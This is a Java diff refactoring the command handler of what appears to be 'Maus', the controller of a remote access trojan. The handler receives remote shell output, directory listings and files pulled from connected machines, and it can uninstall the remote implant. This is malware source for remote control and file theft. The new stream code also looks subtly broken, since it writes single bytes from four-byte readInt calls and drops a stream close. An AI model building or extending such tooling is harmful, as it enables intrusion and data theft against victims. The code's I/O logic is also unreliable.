@@ -18,14 +18,15 @@ import java.io.*;
 class ProcessCommands implements Repository {
 
     static void processCommands(InputStream is, ClientObject client) throws IOException {
-        byte[] buffer = new byte[1024];
-        int read;
-        while ((read = is.read(buffer)) != -1) {
-            String input = new String(buffer, 0, read);
-            Logger.log(Level.INFO, "Received Command: " + input);
+        DataInputStream dis = new DataInputStream(is);
+        while (true) {
+            String input;
+            try {
+                input = dis.readUTF();
+            } catch (EOFException e) {
+                break;
+            }
             if (input.contains("CMD")) {
-                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
-                DataInputStream dis = new DataInputStream(bis);
                 int outputCount = dis.readInt();
                 StringBuilder sb = new StringBuilder();
                 for (int i = 0; i < outputCount; i++) {
@@ -33,16 +34,13 @@ class ProcessCommands implements Repository {
                 }
                 SendCommandView.getConsole().appendText(sb.toString());
             }
-            if (input.contains("FILELIST")) {
-                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
-                DataInputStream dis = new DataInputStream(bis);
+            else if (input.contains("FILELIST")) {
                 String pathName = dis.readUTF();
                 int filesCount = dis.readInt();
                 String[] fileNames = new String[filesCount];
                 for (int i = 0; i < filesCount; i++) {
                     fileNames[i] = dis.readUTF();
                 }
-                dis.close();
                 Platform.runLater(() -> {
                     Stage stage = new Stage();
                     stage.setMinWidth(400);
@@ -53,9 +51,7 @@ class ProcessCommands implements Repository {
                     stage.show();
                 });
             }
-            if (input.contains("DOWNLOAD")) {
-                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
-                DataInputStream dis = new DataInputStream(bis);
+            else if (input.contains("DOWNLOAD")) {
                 String saveDirectory = dis.readUTF();
 
                 long fileLength = dis.readLong();
@@ -64,15 +60,10 @@ class ProcessCommands implements Repository {
                 File downloadedFile = new File(saveDirectory + "/" + fileName);
                 FileOutputStream fos = new FileOutputStream(downloadedFile);
                 BufferedOutputStream bos = new BufferedOutputStream(fos);
+                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
 
-                for (int j = 0; j < fileLength; j++) bos.write(bis.read());
-
-                bos.close();
-                dis.close();
             }
-            if (input.contains("FILES")) {
-                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
-                DataInputStream dis = new DataInputStream(bis);
+            else if (input.contains("FILES")) {
                 int filesCount = dis.readInt();
                 File[] files = new File[filesCount];
                 for (int i = 0; i < filesCount; i++) {
@@ -84,13 +75,12 @@ class ProcessCommands implements Repository {
                     FileOutputStream fos = new FileOutputStream(files[i]);
                     BufferedOutputStream bos = new BufferedOutputStream(fos);
 
-                    for (int j = 0; j < fileLength; j++) bos.write(bis.read());
+                    for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                     bos.close();
                 }
-                dis.close();
             }
             /* Uninstall and close remote server - remove from Maus */
-            if (input.contains("EXIT")) {
+            else if (input.contains("EXIT")) {
                 PseudoBase.getMausData().remove(client.getIP());
                 CONNECTIONS.remove(client.getIP());
                 Controller.updateStats();
